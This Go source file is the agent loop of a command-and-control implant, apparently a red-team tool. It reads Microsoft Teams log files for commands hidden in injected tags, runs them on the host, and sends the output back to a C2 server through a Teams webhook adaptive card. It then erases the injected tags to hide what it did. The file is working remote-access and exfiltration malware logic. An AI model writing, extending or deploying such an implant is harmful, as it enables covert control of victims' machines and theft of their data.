package agent

import (
	"fmt"
	"regexp"
	"time"
)

type Agent struct {
	username string
	agentID  string
}

func (agent *Agent) init() error {
	username, err := getCurrentUserFull()
	if err != nil {
		return err
	}
	agentID, err := getAgentID()
	if err != nil {
		return err
	}
	agent.username = username
	agent.agentID = agentID
	return nil
}

// Main Agent logic
func Start(verbose bool, serverURL string, timeout int, webhookURL string, commandRegex *regexp.Regexp) error {
	if serverURL == "" {
		return fmt.Errorf("serverURL is required")
	}
	if webhookURL == "" {
		return fmt.Errorf("webhookURL is required")
	}

	// Start with finding the Teams log directory
	logDirPath, err := findLogDir()
	if err != nil {
		return err
	}

	if verbose {
		fmt.Printf("\nFound MS Teams log dir at: %s\n\n", logDirPath)
	}

	var agent Agent
	err = agent.init()
	if err != nil {
		return err
	}

	if verbose {
		fmt.Printf("Agent initialized: %s\n", agent)
	}

	// Notify server that a new agent can receive commands
	err = agent.notifyServer(webhookURL, serverURL)
	if err != nil {
		return err
	}

	if verbose {
		fmt.Println("C2 Server notified")
		fmt.Print("Waiting for commands..\n\n")
	}

	for {
		var command string
		var logFilePath string

		// Get the list of log files (may change during time)
		logFiles, err := findLogFiles(logDirPath)
		if err != nil {
			return err
		}

		// Iterate over the log files to find the command
		for _, logFile := range logFiles {
			logFileContent, err := fileBytesToString(logFile)
			if err != nil {
				continue
			}

			// Check for the command in the log file
			command = readCommand(logFileContent, commandRegex, agent.agentID)
			if command != "" {
				logFilePath = logFile
				break // Stop searching after finding the command
			}
		}

		if command == "" {
			time.Sleep(time.Duration(timeout) * time.Second)
			continue
		}

		if verbose {
			fmt.Printf("Found command: %s\n", command)
			fmt.Println("Executing command..")
		}

		// Execute the command
		commandOutput := execCommand(command)

		if verbose {
			fmt.Printf("Command %s executed\n", command)
			fmt.Println("Inserting result in Teams Card and triggering webhook..")
		}

		// Embed result in Teams adaptive card and trigger webhook
		err = agent.sendResultToServer(commandOutput, webhookURL, serverURL)
		if err != nil {
			return err
		}

		if verbose {
			fmt.Println("C2 Server should receive the result shortly..")
			fmt.Print("Cleaning up old commands..\n\n")
		}

		// Clean up old commands by replacing injected hidden tags with an empty string in the file where the command was found
		logFileContent, err := fileBytesToString(logFilePath)
		if err != nil {
			continue
		}
		err = cleanUpOldCommands(commandRegex, logFilePath, logFileContent)
		if err != nil {
			return err
		}

		time.Sleep(time.Duration(timeout) * time.Second)
	}
}
